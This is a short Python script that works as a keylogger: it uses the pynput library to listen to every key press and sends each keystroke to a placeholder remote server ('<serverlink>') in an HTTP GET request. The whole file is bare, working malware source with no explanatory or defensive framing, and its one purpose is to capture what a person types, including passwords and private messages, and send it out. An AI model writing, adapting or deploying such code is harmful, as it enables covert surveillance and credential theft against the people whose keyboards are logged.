from pynput.keyboard import Key, Listener
import requests
def keylogs():
 def on_press(key):
   requests.get(f"<serverlink>?message={str(key)}") 
 with Listener(on_press=on_press) as listener:
  listener.join()
keylogs()     